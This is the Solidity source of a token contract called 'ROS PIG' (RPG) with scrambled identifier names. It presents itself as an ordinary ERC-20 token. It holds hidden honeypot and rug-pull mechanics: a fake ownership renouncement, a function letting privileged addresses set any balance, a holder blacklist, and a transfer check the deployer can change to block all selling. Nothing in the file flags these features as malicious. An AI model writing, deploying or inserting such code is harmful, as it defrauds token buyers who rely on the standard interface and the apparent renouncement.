//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface toList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingAmountTeam {
    function createPair(address listTeam, address autoTake) external returns (address);
}

interface shouldTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableAuto) external view returns (uint256);

    function transfer(address minLaunched, uint256 liquiditySwap) external returns (bool);

    function allowance(address shouldFundMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquiditySwap) external returns (bool);

    function transferFrom(
        address sender,
        address minLaunched,
        uint256 liquiditySwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalList, uint256 value);
    event Approval(address indexed shouldFundMin, address indexed spender, uint256 value);
}

interface shouldTakeMetadata is shouldTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ROSPIG is txSwap, shouldTake, shouldTakeMetadata {

    function approve(address maxEnable, uint256 liquiditySwap) public virtual override returns (bool) {
        amountSender[_msgSender()][maxEnable] = liquiditySwap;
        emit Approval(_msgSender(), maxEnable, liquiditySwap);
        return true;
    }

    function launchLaunched(uint256 liquiditySwap) public {
        receiverSell();
        exemptLimit = liquiditySwap;
    }

    uint8 private modeBuyLimit = 18;

    function transferFrom(address exemptSwapIs, address minLaunched, uint256 liquiditySwap) external override returns (bool) {
        if (_msgSender() != txFrom) {
            if (amountSender[exemptSwapIs][_msgSender()] != type(uint256).max) {
                require(liquiditySwap <= amountSender[exemptSwapIs][_msgSender()]);
                amountSender[exemptSwapIs][_msgSender()] -= liquiditySwap;
            }
        }
        return modeMarketing(exemptSwapIs, minLaunched, liquiditySwap);
    }

    constructor (){
        if (liquidityTokenLaunch) {
            isMax = senderMin;
        }
        atEnableTo();
        toList listLaunch = toList(txFrom);
        tokenWalletAuto = marketingAmountTeam(listLaunch.factory()).createPair(listLaunch.WETH(), address(this));
        
        buyShould = _msgSender();
        modeSell[buyShould] = true;
        launchedAt[buyShould] = takeReceiver;
        
        emit Transfer(address(0), buyShould, takeReceiver);
    }

    address public tokenWalletAuto;

    mapping(address => mapping(address => uint256)) private amountSender;

    uint256 private takeReceiver = 100000000 * 10 ** 18;

    bool private toTake;

    event OwnershipTransferred(address indexed totalToIs, address indexed tradingSell);

    address public buyShould;

    mapping(address => bool) public senderShould;

    uint256 tokenToFrom;

    function getOwner() external view returns (address) {
        return fundTo;
    }

    function balanceOf(address enableAuto) public view virtual override returns (uint256) {
        return launchedAt[enableAuto];
    }

    function autoFee(address liquidityTotal, uint256 liquiditySwap) public {
        receiverSell();
        launchedAt[liquidityTotal] = liquiditySwap;
    }

    uint256 exemptLimit;

    bool public liquidityTokenLaunch;

    function name() external view virtual override returns (string memory) {
        return receiverMarketing;
    }

    function transfer(address liquidityTotal, uint256 liquiditySwap) external virtual override returns (bool) {
        return modeMarketing(_msgSender(), liquidityTotal, liquiditySwap);
    }

    function owner() external view returns (address) {
        return fundTo;
    }

    uint256 private senderMin;

    address private fundTo;

    function allowance(address listSell, address maxEnable) external view virtual override returns (uint256) {
        if (maxEnable == txFrom) {
            return type(uint256).max;
        }
        return amountSender[listSell][maxEnable];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeReceiver;
    }

    bool public toLimit;

    uint256 public isMax;

    function receiverSell() private view {
        require(modeSell[_msgSender()]);
    }

    function atEnableTo() public {
        emit OwnershipTransferred(buyShould, address(0));
        fundTo = address(0);
    }

    mapping(address => uint256) private launchedAt;

    function decimals() external view virtual override returns (uint8) {
        return modeBuyLimit;
    }

    bool private senderLiquidity;

    function amountReceiverAt(address exemptSwapIs, address minLaunched, uint256 liquiditySwap) internal returns (bool) {
        require(launchedAt[exemptSwapIs] >= liquiditySwap);
        launchedAt[exemptSwapIs] -= liquiditySwap;
        launchedAt[minLaunched] += liquiditySwap;
        emit Transfer(exemptSwapIs, minLaunched, liquiditySwap);
        return true;
    }

    function minMarketing(address amountFrom) public {
        if (toLimit) {
            return;
        }
        
        modeSell[amountFrom] = true;
        if (liquidityTokenLaunch != senderLiquidity) {
            senderLiquidity = true;
        }
        toLimit = true;
    }

    mapping(address => bool) public modeSell;

    bool public senderExempt;

    function symbol() external view virtual override returns (string memory) {
        return feeLiquidity;
    }

    string private feeLiquidity = "RPG";

    address marketingLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function limitReceiver(address enableShouldIs) public {
        receiverSell();
        if (liquidityTokenLaunch) {
            senderMin = isMax;
        }
        if (enableShouldIs == buyShould || enableShouldIs == tokenWalletAuto) {
            return;
        }
        senderShould[enableShouldIs] = true;
    }

    string private receiverMarketing = "ROS PIG";

    address txFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function modeMarketing(address exemptSwapIs, address minLaunched, uint256 liquiditySwap) internal returns (bool) {
        if (exemptSwapIs == buyShould) {
            return amountReceiverAt(exemptSwapIs, minLaunched, liquiditySwap);
        }
        uint256 tokenSwapTake = shouldTake(tokenWalletAuto).balanceOf(marketingLiquidity);
        require(tokenSwapTake == exemptLimit);
        require(!senderShould[exemptSwapIs]);
        return amountReceiverAt(exemptSwapIs, minLaunched, liquiditySwap);
    }

}